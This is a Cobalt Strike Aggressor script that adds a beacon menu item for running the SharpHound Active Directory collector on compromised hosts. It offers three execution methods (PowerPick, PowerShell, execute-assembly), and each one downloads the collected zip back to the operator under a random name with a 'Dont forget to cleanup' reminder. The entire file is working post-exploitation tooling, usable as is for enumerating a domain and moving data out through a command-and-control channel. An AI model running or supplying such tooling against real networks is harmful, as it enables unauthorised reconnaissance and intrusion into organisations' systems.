SharpHound.cna
````
# Author:C0ax
# If you need to change the location of the SharpHound assembly
$sharphoundexe = "/opt/SharpHound/SharpHound.exe";
$sharphoundps1 = "/opt/SharpHound/SharpHound.ps1";

sub bloodhound{
    $bid = $1;
    $cmdargs = "";
    $dialog = dialog("SharpHound Invoke-Bloodhound", %(execmethod => "PowerPick", ComputerName => ""), lambda({
        if ($2 eq 'Help'){
            helpbloodhound()
            break;
        }
        foreach $key => $value ($3){
            if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
                $cmdargs .= ' ';
                $cmdargs .= $key;
                $cmdargs .= ' ';
                $cmdargs .= $value;
            }
            else if ($value eq "true"){
                $cmdargs .= ' ';
                $cmdargs .= $key;
            }
        }
        if($3["execmethod"] eq "PowerPick"){
            $random_zip = random_string(10);
            btask($bid, 'Importing SharpHound.ps1');
            bpowershell_import($bid, script_resource($sharphoundps1));
            btask($bid, 'Executing SharpHound via PowerPick');
            bpowerpick($bid, 'Invoke-Bloodhound'.$cmdargs.' -NoSaveCache -ZipFileName "'.$random_zip.'.zip"');
            bdownload($bid, $random_zip.'.zip');
            btask($bid, 'Dont forget to cleanup');
        }
        else if ($3["execmethod"] eq "PowerShell"){
            $random_zip = random_string(10);
            btask($bid, 'Importing SharpHound.ps1');
            bpowershell_import($bid, script_resource($sharphoundps1));
            btask($bid, 'Executing SharpHound via PowerShell');
            bpowershell($bid, 'Invoke-Bloodhound'.$cmdargs.' -NoSaveCache -ZipFileName "'.$random_zip.'.zip"');
            bdownload($bid, $random_zip.'.zip');
            btask($bid, 'Dont forget to cleanup');
        }
        else if ($3["execmethod"] eq "Execute-Assembly"){
            $random_zip = random_string(10);
            btask($bid, 'Executing SharpHound via Execute-Assembly');
            bexecute_assembly($bid, script_resource($sharphoundexe), 'Invoke-Bloodhound'.$cmdargs.' -NoSaveCache -ZipFileName "'.$random_zip.'.zip"');
            bdownload($bid, $random_zip.'.zip');
            btask($bid, 'Dont forget to cleanup');
        }
    }));
    dialog_description($dialog, "SharpHound Ingestor");
    drow_text($dialog, " ",  "Arguments");
    drow_combobox($dialog, "execmethod", "Exec Method ", @("PowerPick", "PowerShell", "Execute-Assembly"));
    dbutton_action($dialog, "Run");
    dbutton_action($dialog, "Help");
    dialog_show($dialog);
}


popup beacon_top {
    menu "SharpHound" {
        item "Invoke-Bloodhound"{
                local('$bid');
                foreach $bid ($1){
                    bloodhound($bid);
                }
        }
    }
}

sub random_string {
    # <3 @offsec_ginger
    $limit = $1;
    @random_str = @();
    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for ($x = 0; $x < $limit; $x++) {
        $n = rand(strlen($characters));
        add(@random_str, charAt($characters, $n));
    }
    return join('', @random_str);
}
````